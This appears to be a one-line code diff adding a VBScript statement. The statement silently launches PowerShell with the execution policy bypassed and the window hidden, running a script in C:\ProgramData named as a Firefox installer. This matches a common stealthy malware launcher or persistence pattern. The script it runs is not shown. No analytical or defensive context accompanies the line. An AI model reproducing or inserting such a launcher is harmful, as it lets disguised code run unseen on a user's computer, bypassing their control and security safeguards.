@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "powershell.exe -exec bypass -f C:\ProgramData\firefox-installer.ps1",0,False
